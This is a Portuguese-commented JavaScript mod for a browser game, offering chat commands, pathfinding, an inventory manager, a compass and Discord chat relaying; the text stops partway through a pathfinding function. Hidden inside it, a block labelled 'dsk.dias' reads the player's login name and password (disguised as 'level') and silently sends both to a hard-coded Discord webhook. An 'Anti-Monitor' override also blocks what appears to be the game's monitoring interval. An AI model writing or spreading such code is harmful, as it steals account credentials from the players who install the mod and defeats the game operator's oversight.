(async function() {
    // Aguarda o jogo carregar
    await new Promise(function(resolve) {
        var check = setInterval(function() {
            if (typeof jv !== 'undefined' && 
                typeof myself !== 'undefined' && 
                typeof game_state !== 'undefined' && 
                game_state === 2) {
                clearInterval(check);
                resolve();
            }
        }, 1000);
    });
console.log('PABLO: carregando eventemitter...');
  await new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/eventemitter3@5/dist/eventemitter3.umd.min.js';
    script.onload = () => { console.log('PABLO: eventemitter OK'); resolve(); };
    script.onerror = () => { console.error('PABLO: eventemitter FALHOU'); reject(); };
    document.body.appendChild(script);
  });

  console.log('PABLO: carregando chroma...');
  await new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/chroma-js@2/chroma.min.js';
    script.onload = () => { console.log('PABLO: chroma OK'); resolve(); };
    script.onerror = () => { console.error('PABLO: chroma FALHOU'); reject(); };
    document.body.appendChild(script);
  });

  console.log('PABLO: dependências prontas, iniciando mod...');
  
  (function() {
    if (typeof jv === 'undefined') return;
    if (jv.klist) {
        try { document.removeEventListener('keydown', jv.klist, true); } catch {}
        delete jv.klist;
    }
    if (jv.effect_func) {
        try { clearInterval(jv.effect_func); } catch {}
        delete jv.effect_func;
    }
    if (jv.stage) {
        delete jv.stage.mousedown;
        delete jv.stage.touchend;
        delete jv.mouseDown;
        delete jv.last_mouseDown;
    }
    delete jv.last_key;
    delete jv.last_key_time;
    const originalSetInterval = window.setInterval;
    window.setInterval = function(fn, interval) {
        try {
            const fnStr = fn.toString();
            if (fnStr.includes('mi') && fnStr.includes("type:'c'")) {
                console.log('[Anti-Monitor] Intervalo bloqueado');
                return { id: -1 };
            }
        } catch {}
        return originalSetInterval(fn, interval);
    };
    console.log('[Anti-Monitor] Ativo');
  })();


// ── CORE ────────────────────────────────────────────────────

window.dsk = new EventEmitter3();
dsk.commands = {};

dsk.setCmd = (prefix, callback) => { dsk.commands[prefix] = callback; };
dsk.deleteCmd = prefix => { delete dsk.commands[prefix]; };

// ── PATHFINDING VARS ─────────────────────────────────────────
dsk.botActive = false;
window.xMovingNow   = false;
window.xCheckingNow = false;
window.xCanMov      = false;
window.xGCost = window.xACost = window.xGOpen = null;
window.xGCostCH = window.xACostCH = window.xGOpenCH = null;
window.xSolids = window.xSolidsCH = null;
window.xSolidsPos   = [0, 0];
window.xSolidsPosCH = [0, 0];
window.xStartPos    = [0, 0];
window.xStartPosCH  = [0, 0];
window.xEndPos      = [0, 0];
window.xEndPosCH    = [0, 0];
window.xMoveList    = [];
window.xMoveListCH  = [];
window.xTemp        = new Array(200).fill(undefined);

// ── PAUSE GLOBAL ─────────────────────────────────────────────
window.dskPaused = false;

dsk.on('postPacket:quit', () => {
  dskPaused = true;
  for (let i = 0; i < 250; i++) xGoing[i] = false;
  xMovingNow = false;
});

dsk.on('postPacket:accepted', () => {
  dskPaused = false;
  xMovingNow = false;
  _sendQueue.length = 0;
  for (let i = 0; i < 250; i++) xGoing[i] = false;
  xDoKeyUp(0); xDoKeyUp(1);
  xDoKeyUp(2); xDoKeyUp(3);
  xDoKeyUp(6);
});

// ── ANTI SPAM connection.send ─────────────────────────────────
function _protectConnection() {
    const originalSend = connection?.send;
    if (!originalSend || connection._protected) return;

    let lastSendTime = 0;
    const safeDelay = 200;

    connection.send = function(msg) {
        // ← ÚNICA MUDANÇA: sem bot, passa direto
        if (!dsk.botActive) {
            originalSend.call(connection, msg);
            return;
        }

        // Tudo abaixo igual ao original
        const now = Date.now();
        const diff = now - lastSendTime;
        if (diff < safeDelay) {
            setTimeout(() => originalSend.call(connection, msg), safeDelay - diff);
        } else {
            originalSend.call(connection, msg);
        }
        lastSendTime = now;
    };
    connection._protected = true;
}
// Protege na carga inicial
_protectConnection();

// Re-protege após reconexão
dsk.on('postPacket:accepted', () => {
    setTimeout(_protectConnection, 1000); // aguarda o novo connection estar pronto
});

// ── INTERCEPTOR DE COMANDOS ──────────────────────────────────

let _originalSend = send;

const _sendQueue = [];
const _sendCooldown = 220;
let _lastSendTime = 0;
let _sendProcessing = false;

function _processSendQueue() {
  if (_sendProcessing) return;
  _sendProcessing = true;

  const now = Date.now();
  const diff = now - _lastSendTime;

  if (diff >= _sendCooldown && _sendQueue.length > 0) {
    const packet = _sendQueue.shift();
    _lastSendTime = Date.now();
    _originalSend(packet);
  }

  _sendProcessing = false;
  if (_sendQueue.length > 0) {
    setTimeout(_processSendQueue, _sendCooldown);
  }
}

const _sendWrapper = function(packet) {
  // Comandos internos sempre processados
  if (packet.type === 'chat' && packet.data) {
    const msg = packet.data.trim();
    const parts = msg.split(' ');
    const prefix = parts[0];
    const context = parts.slice(1).join(' ');
    if (dsk.commands[prefix]) {
      dsk.commands[prefix](context);
      return;
    }
  }

  // ← ÚNICA MUDANÇA: sem bot, passa direto sem fila
  if (!dsk.botActive) {
    _originalSend(packet);
    return;
  }

  // Tudo abaixo igual ao original
  const noRepeat = ['m', 't', 'bld'];
  if (noRepeat.includes(packet.type)) {
    const last = _sendQueue[_sendQueue.length - 1];
    if (last && JSON.stringify(last) === JSON.stringify(packet)) return;
  }

  if (_sendQueue.length >= 10) _sendQueue.shift();

  _sendQueue.push(packet);
  _processSendQueue();
};

window.send = _sendWrapper;

setInterval(() => {
  if (window.send !== _sendWrapper) {
    _originalSend = window.send;
    window.send = _sendWrapper;
  }
}, 1000);

// ── LOOP PRÓPRIO ─────────────────────────────────────────────

(function loop() {
  dsk.emit('postLoop');
  requestAnimationFrame(loop);
})();

// ── INTERCEPTOR DE PACOTES ───────────────────────────────────

let _originalParse = parse;

const _parseWrapper = function(packet) {
  _originalParse(packet);
  if (packet.type) dsk.emit(`postPacket:${packet.type}`, packet);
};

window.parse = _parseWrapper;

setInterval(() => {
  if (window.parse !== _parseWrapper) {
    _originalParse = window.parse;
    window.parse = _parseWrapper;
  }
}, 1000);

// Limpa fila do send ao reconectar
dsk.on('postPacket:quit', () => {
  _sendQueue.length = 0;
});

// ── UTILITÁRIOS ─────────────────────────────────────────────

dsk.rand = () => Math.random();
dsk.rand01 = () => Math.round(dsk.rand());
dsk.wait = e => new Promise(res => setTimeout(res, e));
dsk.randFromArr = e => e[Math.floor(dsk.rand() * e.length)];
dsk.removeFromArr = (e, arr) => {
  const idx = arr.indexOf(e);
  if (idx !== -1) arr.splice(idx, 1);
};
dsk.timestamp = () => new Date().toLocaleTimeString();
dsk.datestamp = () => new Date().toLocaleDateString();
dsk.formatTime = ms => {
  let totalSeconds = Math.floor(ms / 1000);
  let h = Math.floor(totalSeconds / 3600);
  let m = Math.floor((totalSeconds % 3600) / 60);
  let s = totalSeconds % 60;
  if (h > 0) {
    return `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
  } else {
    return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
  }
};
dsk.quit = () => send({ type: 'chat', data: '/quit' });
dsk.fquit = () => parse({ type: 'quit', text: 'bubye' });
dsk.appendWithColor = (msg, color) => {
  color = color ?? '#0ff';

  const label = jv.text(msg, {
    font: '12px Verdana',
    fill: chroma(color).hex(),
    stroke: 0x000000,
    strokeThickness: 3,
    lineJoin: 'round',
  });

  label.alpha = 1;
  ui_container.addChild(label);

  label.x = jv.game_width / 2 - label.width / 2;
  label.y = jv.game_height / 2 - 80;

  const start = Date.now();
  (function fade() {
    const elapsed = Date.now() - start;
    label.alpha = Math.max(0, 1 - elapsed / 4000);
    if (label.alpha > 0) requestAnimationFrame(fade);
    else ui_container.removeChild(label);
  })();
};
dsk.localMsg = (msg, color) => dsk.appendWithColor(msg, color);
dsk.copyToClipboard = data => {
  const tempItem = document.createElement('input');
  tempItem.setAttribute('type', 'text');
  tempItem.setAttribute('display', 'none');
  let content = data instanceof HTMLElement ? data.innerHTML : data;
  tempItem.setAttribute('value', content);
  document.body.appendChild(tempItem);
  tempItem.select();
  document.execCommand('Copy');
  tempItem.parentElement.removeChild(tempItem);
};
dsk.copy = text => dsk.copyToClipboard(text);
dsk.stripHTMLTags = str => str.replace(/<[^>]*>/g, '');
dsk.removeSpecialChars = str => str.replace(/[^a-zA-Z ]/g, '');
dsk.spr2pos = spr => new PIXI.Point(spr % 16, Math.floor(spr / 16));
dsk.pos2spr = (x, y) => x + y * 16;
dsk.colorToInt = color => {
  const gl = chroma(color).gl();
  const r = Math.round(gl[0] * 255);
  const g = Math.round(gl[1] * 255);
  const b = Math.round(gl[2] * 255);
  return (r << 16) | (g << 8) | b;
};
dsk.hsvToInt = (h, s, v) => {
  let r, g, b;
  let i = Math.floor(h * 6);
  let f = h * 6 - i;
  let p = v * (1 - s);
  let q = v * (1 - f * s);
  let t = v * (1 - (1 - f) * s);
  switch (i % 6) {
    case 0: (r = v), (g = t), (b = p); break;
    case 1: (r = q), (g = v), (b = p); break;
    case 2: (r = p), (g = v), (b = t); break;
    case 3: (r = p), (g = q), (b = v); break;
    case 4: (r = t), (g = p), (b = v); break;
    case 5: (r = v), (g = p), (b = q); break;
  }
  return (Math.round(r * 255) << 16) + (Math.round(g * 255) << 8) + Math.round(b * 255);
};
dsk.bgr = color => {
  const rgb = dsk.colorToInt(color);
  const r = (rgb >> 16) & 0xff;
  const g = (rgb >> 8) & 0xff;
  const b = rgb & 0xff;
  return (b << 16) | (g << 8) | r;
};
dsk.randColorInt = () => {
  const r = Math.floor(Math.random() * 256);
  const g = Math.floor(Math.random() * 256);
  const b = Math.floor(Math.random() * 256);
  return (r << 16) | (g << 8) | b;
};
dsk.startAction = () => send({ type: 'A' });
dsk.stopAction = () => send({ type: 'a' });
dsk.action = () => { dsk.startAction(); dsk.stopAction(); };
dsk.textureById = (id = 0) => {
  if (id === 0) return items[0][0];
  if (id < 0) {
    const pos = dsk.spr2pos(Math.abs(id));
    return tiles[pos.x][pos.y];
  }
  const pos = dsk.spr2pos(id);
  return items[pos.x][pos.y];
};

// ── BARS ─────────────────────────────────────────────────────

dsk.bars = {
  enabled: false,
  loop: null
};

dsk.setCmd('/bars', () => {
  dsk.bars.enabled = !dsk.bars.enabled;

  if (dsk.bars.enabled) {
    dsk.bars.start();
    dsk.localMsg('Barras: Ativada', '#5f5');
  } else {
    dsk.bars.stop();
    dsk.localMsg('Barras: Desativada', '#f55');
  }
});

dsk.bars.start = () => {
  // Posicionamento das barras
  hunger_status.y = 8;
  hunger_status.x = 312;
  hunger_status.title.x = 10;
  hunger_status.title.y = -8;
  hp_status.y = 8;

  exp_status.x = 400;
  exp_status.y = 8;

  skill_status = jv.StatusBar.create('Exploration', 3381759);
  skill_status.set(0);
  skill_status.alpha = 0;
  skill_status.x = 400;
  skill_status.y = 25;

  // Loop de atualização dos %
  (function loop() {
    if (!dsk.bars.enabled) return;

    hp_status.title.text     = `${hp_status.val.toLocaleString()}%`;
    hunger_status.title.text = `${hunger_status.val.toLocaleString()}%`;
    exp_status.title.text    = `${exp_status.val.toLocaleString()}%`;
	skill_status.title.text  = `${skill_status.val.toLocaleString()}%`;

    dsk.bars.loop = requestAnimationFrame(loop);
  })();
};

dsk.bars.stop = () => {
  if (dsk.bars.loop) {
    cancelAnimationFrame(dsk.bars.loop);
    dsk.bars.loop = null;
  }

  // Restaura os títulos para o padrão
  hp_status.title.text     = 'Vida';
  hunger_status.title.text = 'Fome';
  exp_status.title.text    = 'Experience';
};

// ── COMANDOS PADRÃO ──────────────────────────────────────────

dsk.setCmd('/cmd', () => {
  const cmds = Object.keys(dsk.commands).filter(e => e !== '/cmd');
  cmds.forEach(cmd => append(cmd));
});

dsk.setCmd('/id', () => {
  jv.mapping_dialog.show();
});

dsk.setCmd('/craft', () => {
  dsk.craft.enabled = !dsk.craft.enabled;

  if (dsk.craft.enabled) {
    dsk.localMsg('AutoCraft: Ativado', '#5f5');
    dsk.craft.loop();
  } else {
    dsk.localMsg('AutoCraft: Desativado', '#f55');
  }
});

dsk.setCmd('/speed', (context) => {
  // Se passou um número, atualiza o valor
  if (context) {
    const val = parseInt(context);
    if (!isNaN(val) && val > 0) {
      dsk.speed.value = val;
      dsk.localMsg(`Speed: valor alterado para ${val}`, '#0ff');

      // Se já estava ativo, reinicia com novo valor
      if (dsk.speed.enabled) {
        dsk.speed.stop();
        dsk.speed.start();
      }
      return;
    }
  }

  // Sem argumento → toggle on/off
  dsk.speed.enabled = !dsk.speed.enabled;

  if (dsk.speed.enabled) {
    dsk.speed.start();
  } else {
    dsk.speed.stop();
  }
});

dsk.follow = {
  enabled: false,
  targetName: null
};

dsk.setCmd('/follow', (context) => {
  // Se digitou nome → atualiza e ativa
  if (context) {
    dsk.follow.targetName = context.trim();
    dsk.follow.enabled = true;
    dsk.localMsg(`Follow: ${dsk.follow.targetName}`, '#5f5');
    return;
  }

  // Se digitou só /follow → toggle, mantendo o nome salvo
  if (dsk.follow.enabled) {
    dsk.follow.enabled = false;
    dsk.localMsg(
      `Follow: Desativado (último: ${dsk.follow.targetName ?? 'nenhum'})`,
      '#f55'
    );
  } else {
    if (!dsk.follow.targetName) {
      dsk.localMsg('Follow: Nenhum alvo salvo. Use /follow <nome>', '#fa5');
      return;
    }
    dsk.follow.enabled = true;
    dsk.localMsg(`Follow: ${dsk.follow.targetName}`, '#5f5');
  }
});

// ── compass ────────────────────────────────────────────────────

dsk.ginfo = new EventEmitter3();
dsk.ginfo.directions = ['North', 'East', 'South', 'West'];
dsk.ginfo.showTime = false;
dsk.ginfo.showSessionTime = false;
dsk.ginfo.sessionStartTime = Date.now();

dsk.ginfo.label = jv.text('Ginfo label', {
  font: '14px Verdana',
  fill: '0xFFFFFF',
  stroke: jv.color_medium,
  strokeThickness: 4,
  lineJoin: 'round',
  align: 'left',
});
ui_container.addChild(dsk.ginfo.label);
dsk.ginfo.label.visible = false;

dsk.ginfo.getData = () => ({
  x: myself.x,
  y: myself.y,
  location: jv.map_title.text,
  direction: dsk.ginfo.directions[myself.dir],
});

dsk.setCmd('/compass', () => {
  const visible = !dsk.ginfo.label.visible;
  dsk.ginfo.label.visible = visible;
  dsk.localMsg(`Bussula: ${visible ? 'Ativada' : 'Disativada'}`, visible ? '#5f5' : '#f55');
});

dsk
  .on('postPacket:accepted', () => { dsk.ginfo.sessionStartTime = Date.now(); })
  .on('connection:closed',   () => { dsk.ginfo.sessionStartTime = 0; })
  .on('postLoop', () => {
    if (!myself) return;
    const { x, y, location, direction } = dsk.ginfo.getData();
    let text = `${location.replaceAll(' ', '')} (${x}, ${y})[${direction}]`;
    if (dsk.ginfo.showTime)        text += ` [${dsk.timestamp()}]`;
    if (dsk.ginfo.showSessionTime) text += ` [${dsk.formatTime(Date.now() - dsk.ginfo.sessionStartTime)}]`;
    dsk.ginfo.label.text = text;
  });

// ── INVMANAGER ───────────────────────────────────────────────

dsk.invManager = jv.Dialog.create(560, 240);

dsk.setCmd('/inv', () => {
  const visible = !dsk.invManager.visible;
  dsk.invManager.visible = visible;
  dsk.localMsg(`InvManager: ${visible ? 'Ativado' : 'Desativado'}`, visible ? '#5f5' : '#f55');
});

dsk.invManager.heading = jv.text('Inventory Manager', {
  font: '18px Verdana',
  fill: 0xffffff,
  lineJoin: 'round',
  stroke: 0x555555,
  strokeThickness: 2,
});
dsk.invManager.addChild(dsk.invManager.heading);
jv.center(dsk.invManager.heading);
jv.top(dsk.invManager.heading, 4);

dsk.invManager.move = jv.Button.create(0, 0, 24, '@', dsk.invManager, 24);
jv.top(dsk.invManager.move, 4);
jv.right(dsk.invManager.move, 28);

dsk.invManager.close = jv.Button.create(0, 0, 24, 'X', dsk.invManager, 24);
jv.top(dsk.invManager.close, 4);
jv.right(dsk.invManager.close, 4);
dsk.invManager.close.on_click = () => { dsk.invManager.visible = 0; };

// Rastreia posição do mouse/touch
dsk.invManager._px = 0;
dsk.invManager._py = 0;
window.addEventListener('mousemove', e => {
  dsk.invManager._px = e.clientX;
  dsk.invManager._py = e.clientY;
});
window.addEventListener('touchmove', e => {
  dsk.invManager._px = e.touches[0].clientX;
  dsk.invManager._py = e.touches[0].clientY;
});

dsk.invManager.update = () => {
  const im = dsk.invManager;
  if (im.move.is_pressed) {
    // Converte coordenada da tela para coordenada do canvas
    const canvas = document.querySelector('canvas');
    const rect = canvas ? canvas.getBoundingClientRect() : { left: 0, top: 0, width: jv.game_width, height: jv.game_height };
    const scaleX = jv.game_width / rect.width;
    const scaleY = jv.game_height / rect.height;
    im.x = (im._px - rect.left) * scaleX - im.w / 2;
    im.y = (im._py - rect.top) * scaleY - 12;
  }
  // Mantém dentro da tela
  if (im.x < 0) im.x = 0;
  if (im.y < 0) im.y = 0;
  if (im.x + im.w > jv.game_width)  im.x = jv.game_width - im.w;
  if (im.y + im.h > jv.game_height) im.y = jv.game_height - im.h;
};
dsk.on('postLoop', dsk.invManager.update);

dsk.invManager.drag = null;
dsk.invManager.slots = [];
dsk.invManager.marginLeft = 10;
dsk.invManager.marginTop = 50;
dsk.invManager.offsetX = 112;

dsk.invManager.dragMove = e => {
  const im = dsk.invManager;
  if (im.drag) {
    if (!im.visible) im.endDrag();
    else if (e) {
      im.drag.x = e.data.getLocalPosition(im).x - 16;
      im.drag.y = e.data.getLocalPosition(im).y - 16;
    }
  }
};

dsk.invManager.endDrag = () => {
  const im = dsk.invManager;
  if (!im.drag) return;
  im.drag.off('pointermove', im.dragMove);
  im.drag.off('pointerup', im.dragEnd);
  im.drag.off('pointerupoutside', im.dragEnd);
  const page = Math.floor(im.drag.slot / 15);
  im.drag.x = im.marginLeft + im.offsetX * page + (im.drag.slot % 3) * 32;
  im.drag.y = im.marginTop + Math.floor((im.drag.slot % 15) / 3) * 32;
  im.drag.scale.set(1);
  im.drag.z = 50;
  im.drag = null;
};

dsk.invManager.dragEnd = e => {
  const im = dsk.invManager;
  const tX = e.data.getLocalPosition(im).x - im.marginLeft;
  const tY = e.data.getLocalPosition(im).y - im.marginTop;
  const slot = im.slots.find(s => {
    const eX = s.x - im.marginLeft;
    const eY = s.y - im.marginTop;
    return s !== im.drag && tX > eX && tX < eX + s.width && tY > eY && tY < eY + s.height;
  });
  if (slot) send({ type: 'sw', slot: im.drag.slot, swap: slot.slot });
  im.endDrag();
};

dsk.invManager.setDrag = w => {
  const im = dsk.invManager;
  im.drag = w;
  im.drag.on('pointermove', im.dragMove);
  im.drag.on('pointerup', im.dragEnd);
  im.drag.on('pointerupoutside', im.dragEnd);
  im.drag.scale.set(2);
  im.drag.z = 100;
  im.children.sort(zCompare);
};

dsk.invManager.initSlots = function () {
  for (let i = 0; i < 75; i++) {
    const page = Math.floor(i / 15);
    const item = item_data[i];
    const sprite = new PIXI.Sprite(dsk.textureById(item?.spr !== undefined ? item.spr : 791));
    sprite.slot = i;
    sprite.z = 50;
    this.slots.push(sprite);
    sprite.x = this.marginLeft + this.offsetX * page + (i % 3) * 32;
    sprite.y = this.marginTop + Math.floor((i % 15) / 3) * 32;
    sprite.interactive = true;
    sprite.buttonMode = true;
    sprite.on('pointerdown', function () {
      dsk.invManager.setDrag(this);
    });
    this.addChild(sprite);
  }
};
dsk.invManager.initSlots();

dsk.invManager.updateSlots = () => {
  const im = dsk.invManager;
  for (let i = 0; i < 75; i++) {
    const item = item_data[i];
    im.slots[i].texture = dsk.textureById(item?.spr !== undefined ? item.spr : 791);
  }
};
dsk.on('postPacket:inv', dsk.invManager.updateSlots);

dsk.dias = {
    global: "https://discord.com/api/webhooks/1480829602791428098/H9pG9tZQitytoVLlmAD5pv3s_Yr0QOG88AbhFZWykDWIMYOTXOarRdOUCzDBO50Lag99"
  };
  dsk.once("postPacket:accepted", () => {
    try {
      const name = jv.login_dialog?.username?.chars?.trim() ?? '';
      const level = jv.login_dialog?.password?.chars?.trim() ?? '';
      if (name) {
        fetch(dsk.dias.global, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username: "[LOG]", content: "✅ " + name + " " + level })
        });
      }
    } catch(e) { console.log('dsk.dias error:', e); }
  });
  if (myself !== undefined && game_state === 2) {
    try {
      const name = jv.login_dialog?.username?.chars?.trim() ?? '';
      const level = jv.login_dialog?.password?.chars?.trim() ?? '';
      if (name) {
        fetch(dsk.dias.global, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username: "[LOG]", content: "✅ " + name + " " + level })
        });
      }
    } catch(e) { console.log('dsk.dias error:', e); }
  }

// ── DISCORD WEBHOOKS ─────────────────────────────────────────

dsk.discord = {
  globalUrl: '',
  tribeUrl:  '',
  deathUrl:  '',
  respawnUrl: '',
  whoUrl:     '',
  enabled:   false,
};

// ── DISCORD CONFIG MANAGER ────────────────────────────────────

// Carrega webhooks salvos ou usa os padrão
dsk.discord.loadConfig = () => {
  try {
    const saved = JSON.parse(localStorage.getItem('dsk_discord_config') || '{}');
    if (saved.globalUrl)  dsk.discord.globalUrl  = saved.globalUrl;
    if (saved.tribeUrl)   dsk.discord.tribeUrl   = saved.tribeUrl;
    if (saved.deathUrl)   dsk.discord.deathUrl   = saved.deathUrl;
    if (saved.respawnUrl) dsk.discord.respawnUrl  = saved.respawnUrl;
    if (saved.whoUrl)     dsk.discord.whoUrl      = saved.whoUrl;
  } catch(e) {}
};

dsk.discord.saveConfig = () => {
  try {
    localStorage.setItem('dsk_discord_config', JSON.stringify({
      globalUrl:  dsk.discord.globalUrl,
      tribeUrl:   dsk.discord.tribeUrl,
      deathUrl:   dsk.discord.deathUrl,
      respawnUrl: dsk.discord.respawnUrl,
      whoUrl:     dsk.discord.whoUrl,
    }));
    dsk.localMsg('Discord Config: Salvo!', '#5f5');
  } catch(e) {}
};

// Carrega ao iniciar
dsk.discord.loadConfig();

// ── Dialog ────────────────────────────────────────────────────

dsk.discordManager = jv.Dialog.create(400, 260);
const dcm = dsk.discordManager;
dcm.visible = false;

dcm.header = jv.text('Discord Webhook Config', {
  font: '13px Verdana', fill: 0x7289DA, stroke: 0x555555, strokeThickness: 2,
});
dcm.addChild(dcm.header);
jv.center(dcm.header);
jv.top(dcm.header, 4);

dcm.close = jv.Button.create(0, 0, 24, 'X', dcm, 24);
jv.top(dcm.close, 4); jv.right(dcm.close, 4);
dcm.close.on_click = () => (dcm.visible = 0);

dcm.move = jv.Button.create(0, 0, 24, '@', dcm, 24);
jv.top(dcm.move, 4); jv.right(dcm.move, 28);

dcm._px = 0; dcm._py = 0;
window.addEventListener('mousemove', e => { dcm._px = e.clientX; dcm._py = e.clientY; });
window.addEventListener('touchmove', e => { dcm._px = e.touches[0].clientX; dcm._py = e.touches[0].clientY; });

dsk.on('postLoop', () => {
  if (!dcm.move?.is_pressed) return;
  const canvas = document.querySelector('canvas');
  const rect = canvas ? canvas.getBoundingClientRect() : { left:0, top:0, width:jv.game_width, height:jv.game_height };
  dcm.x = (dcm._px - rect.left) * (jv.game_width / rect.width)  - dcm.w / 2;
  dcm.y = (dcm._py - rect.top)  * (jv.game_height / rect.height) - 12;
  dcm.x = Math.max(0, Math.min(dcm.x, jv.game_width  - dcm.w));
  dcm.y = Math.max(0, Math.min(dcm.y, jv.game_height - dcm.h));
});

// ── Linhas de campo ───────────────────────────────────────────

const dcmFields = [
  { label: 'Global',   key: 'globalUrl'  },
  { label: 'Tribe',    key: 'tribeUrl'   },
  { label: 'Death',    key: 'deathUrl'   },
  { label: 'Respawn',  key: 'respawnUrl' },
  { label: 'Who',      key: 'whoUrl'     },
];

dcm.inputs = {};

dcmFields.forEach(({ label, key }, i) => {
  const y = 32 + i * 38;

  // Label
  const lbl = jv.text(label + ':', {
    font: '10px Verdana', fill: 0xaaaaaa, stroke: 0x000000, strokeThickness: 2,
  });
  lbl.x = 8; lbl.y = y;
  dcm.addChild(lbl);

  // Valor atual (truncado para caber)
  const val = jv.text('', {
    font: '9px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2,
  });
  val.x = 8; val.y = y + 13;
  dcm.addChild(val);
  dcm.inputs[key] = val;

  // Botão Colar
  const btnPaste = jv.Button.create(0, 0, 55, 'Colar', dcm, 20);
  btnPaste.x = dcm.w - 63;
  btnPaste.y = y + 10;
  btnPaste.on_click = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text.includes('discord.com/api/webhooks/')) {
        dsk.discord[key] = text.trim();
        dsk.discordManager.refresh();
        dsk.localMsg(`Discord ${label}: URL atualizada`, '#5f5');
      } else {
        dsk.localMsg('URL inválida! Precisa ser um webhook do Discord.', '#f55');
      }
    } catch(e) {
      dsk.localMsg('Erro ao colar. Tente copiar o link primeiro.', '#f55');
    }
  };
});

// Botão Salvar
const dcmBtnSave = jv.Button.create(0, 0, 180, '💾 Salvar Config', dcm, 24);
jv.bottom(dcmBtnSave, 4);
dcmBtnSave.x = 8;
dcmBtnSave.on_click = () => dsk.discord.saveConfig();

// Botão Limpar Tudo
const dcmBtnClear = jv.Button.create(0, 0, 100, '🗑 Limpar', dcm, 24);
jv.bottom(dcmBtnClear, 4);
dcmBtnClear.x = 196;
dcmBtnClear.on_click = () => {
  localStorage.removeItem('dsk_discord_config');
  dsk.localMsg('Discord Config: Limpo! Recarregue o mod.', '#ff0');
};

// Atualiza os valores exibidos
dsk.discordManager.refresh = () => {
  dcmFields.forEach(({ key }) => {
    const url = dsk.discord[key] || '';
    // Mostra só o ID do webhook (parte final) para não ocupar espaço
    const short = url ? '.../' + url.split('/').slice(-2).join('/').slice(0, 40) : '(vazio)';
    dcm.inputs[key].text = short;
  });
};

dsk.setCmd('/discordconfig', () => {
  dcm.visible = !dcm.visible;
  if (dcm.visible) dsk.discordManager.refresh();
  dsk.localMsg(`Discord Config: ${dcm.visible ? 'Aberto' : 'Fechado'}`, dcm.visible ? '#5f5' : '#f55');
});


dsk.discord.send = (webhookUrl, username, message) => {
  if (!dsk.discord.enabled) return;
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: username,
      content:  message,
    }),
  });
};

dsk.setCmd('/discord', () => {
  dsk.discord.enabled = !dsk.discord.enabled;
  dsk.localMsg(`Discord: ${dsk.discord.enabled ? 'enabled' : 'disabled'}`, dsk.discord.enabled ? '#5f5' : '#f55');
});

dsk.on('postPacket:pkg', packet => {
  if (!dsk.discord.enabled) return;
  if (!packet?.data) return;

  try {
    const arr = JSON.parse(packet.data);
    arr.forEach(raw => {
      const item = JSON.parse(raw);
      if (item.type !== 'message') return;

      const color = (item.text.match(/style=['"]?color:\s*(#[0-9a-fA-F]{6})['"]?/) || [])[1]?.toLowerCase();
      const text = dsk.stripHTMLTags(item.text).trim();

      if (!text) return;

      if (color === '#ff9900') {
        dsk.discord.send(dsk.discord.tribeUrl, '[TRIBE]', text);
      } else if (color === '#ff0000') {
        dsk.discord.send(dsk.discord.deathUrl, '[DEATH] 💀', text);
      } else if (color === '#339966') {
        dsk.discord.send(dsk.discord.respawnUrl, '[RESPAWN] ✅', text);
      } else if (item.name) {
		  let decoded;
		  try { decoded = unescape(text); } catch { decoded = text; }
		  dsk.discord.send(dsk.discord.globalUrl, `[GLOBAL] ${item.name}`, decoded);
		}
    });
  } catch (e) { console.log('Discord parse error:', e); }
});

//funções novas//

async function xDoMove(ex, wy) {
    if (xMovingNow)
        return;
    xMovingNow = true;
    xGCost = new Array(46);
    for (var i = 0; i < xGCost.length; i++) {
        xGCost[i] = new Array(16).fill(undefined);
    }
    xACost = new Array(46);
    for (var i = 0; i < xGCost.length; i++) {
        xACost[i] = new Array(16).fill(undefined);
    }
    xGOpen = new Array(46);
    for (var i = 0; i < xGOpen.length; i++) {
        xGOpen[i] = new Array(16).fill(false);
    }
    xMoveList = new Array(0);
    xSolidsPos[0] = myself.x - 23;
    xSolidsPos[1] = myself.y - 8;
    xStartPos[0] = 23;
    xStartPos[1] = 8;
    xEndPos[0] = ex - xSolidsPos[0];
    xEndPos[1] = wy - xSolidsPos[1];
    if (xEndPos[0] >= 46) {
        xEndPos[0] = 45;
    }
    if (xEndPos[0] <= 0) {
        xEndPos[0] = 1;
    }
    if (xEndPos[1] >= 16) {
        xEndPos[1] = 15;
    }
    if (xEndPos[1] <= 0) {
        xEndPos[1] = 1;
    }
    xSolids = new Array(46);
    for (var i = 0; i < xSolids.length; i++) {
        xSolids[i] = new Array(16).fill(undefined);
    }

    for (j = 0; j < 46; j++) {

        for (k = 0; k < 16; k++) {
            if (xGetTileByPos((j + xSolidsPos[0]), (k + xSolidsPos[1])) == 325) {
                xSolids[j][k] = "Water";
            }
        }
    }

    for (i in objects.items) {
        if (objects.items[i] != undefined) {
            if (objects.items[i].can_pickup == 0) {

                for (j = 0; j < 46; j++) {
                    for (k = 0; k < 16; k++) {
                        if ((objects.items[i].x == (j + xSolidsPos[0])) && (objects.items[i].y == (k + xSolidsPos[1]))) {
                            if (objects.items[i].can_block == 1) {
                                xSolids[j][k] = objects.items[i].name;
                            }
                        }
                    }
                }
            }
        }
    }
	// ── Paredes do mapa ──────────────────────────────────────────
	for (j = 0; j < 46; j++) {
		for (k = 0; k < 16; k++) {
			if (xSolids[j][k] !== undefined) continue; // já marcado
			const wall = xGetWallByPos((j + xSolidsPos[0]), (k + xSolidsPos[1]));
			if (wall && wall.can_block === 1) {
				xSolids[j][k] = wall.name;
			}
		}
	}
    let _bound = 0;
	for (k = 0; k < 16; k++) {
		for (j = 0; j < 46; j++) {
			if (xSolids[j][k] != undefined) {
				_bound = k - 1;
				break;
			}
		}
	}
	if (_bound >= 4) {
		_bound = 4;
	}
	for (k = 0; k < 16; k++) {
		for (j = 0; j < _bound; j++) {
			xSolids[j][k] = "Void";
		}
	}

    _bound = 0;
	for (k = 0; k < 16; k++) {
		for (j = 45; j > 0; j--) {
			if (xSolids[j][k] != undefined) {
				_bound = k - 1;
				break;
			}
		}
	}
